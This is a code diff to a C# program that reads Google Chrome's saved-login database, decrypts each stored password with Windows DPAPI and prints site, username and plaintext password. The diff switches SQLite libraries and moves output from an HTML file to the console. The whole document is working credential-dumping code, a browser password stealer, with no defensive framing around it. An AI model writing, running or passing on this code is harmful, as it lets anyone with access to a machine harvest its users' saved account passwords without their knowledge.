@@ -4,8 +4,7 @@ using System.IO;
 using System.Data;
 using System.Runtime.InteropServices;
 using System.ComponentModel;
-using System.Reflection;
-using System.Data.SQLite;
+using Community.CsharpSqlite.SQLiteClient;
 
 public class DPAPI
 {
@@ -335,7 +334,7 @@ public static class ProgramCode
         try
         {
             string filename = "my_chrome_passwords.html"; 
-            StreamWriter Writer = new StreamWriter(filename, false, Encoding.UTF8);
+            //StreamWriter Writer = new StreamWriter(filename, false, Encoding.UTF8);
             string db_way = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData)
 				+ "/Google/Chrome/User Data/Default/Login Data"; // a path to a database file
 			Console.WriteLine("DB file = " + db_way);
@@ -345,31 +344,37 @@ public static class ProgramCode
                                    // Output always is Null
             // Connect to DB
             string ConnectionString = "data source=" + db_way + ";New=True;UseUTF16Encoding=True";
+
+           
+            ConnectionString = string.Format("Version=3,uri=file:{0}", db_way);
+
             DataTable DB = new DataTable();
             string sql = string.Format("SELECT * FROM {0} {1} {2}", db_field, "", "");
             
-            using (var connect = new SQLiteConnection(ConnectionString) )
+            using (var connect = new SqliteConnection(ConnectionString) )
             {
-                var command = new SQLiteCommand(sql, connect);
+                var command = new SqliteCommand(sql, connect);
 
-                SQLiteCommand command2 = new SQLiteCommand(sql, connect);
-                var adapter = new SQLiteDataAdapter(command);
+                SqliteCommand command2 = new SqliteCommand(sql, connect);
+                var adapter = new SqliteDataAdapter(command);
 
                 adapter.Fill(DB);
                 int rows = DB.Rows.Count;
                 for (int i = 0; i < rows; i++)
                 {
-                    Writer.Write(i + 1 + ") "); // Here we print order number of our trinity "site-login-password"
-                    Writer.WriteLine(DB.Rows[i][1] + "<br>"); // site URL
-                    Writer.WriteLine(DB.Rows[i][3] + "<br>"); // login
+                    Console.Write(i + 1 ); // Here we print order number of our trinity "site-login-password"
+                    Console.WriteLine(String.Format(" . Site: {0}" , DB.Rows[i][1]) ); // site URL
+                    //Console.WriteLine(DB.Rows[i][3]  ); // login
                     // Here the password description
                     byte[] byteArray = (byte[])DB.Rows[i][5];
                     byte[] decrypted = DPAPI.Decrypt(byteArray, entropy, out description);
                     string password = new UTF8Encoding(true).GetString(decrypted);
-                    Writer.WriteLine(password + "<br><br>");
+                    Console.WriteLine(String.Format("Username {0} = {1}" , DB.Rows[i][3], password) );
+                    Console.WriteLine("--");
+                    //Console.WriteLine(DB.Rows);
                 }
             }
-            Writer.Close();            
+            //Writer.Close();            
         }
         catch (Exception ex)
         {
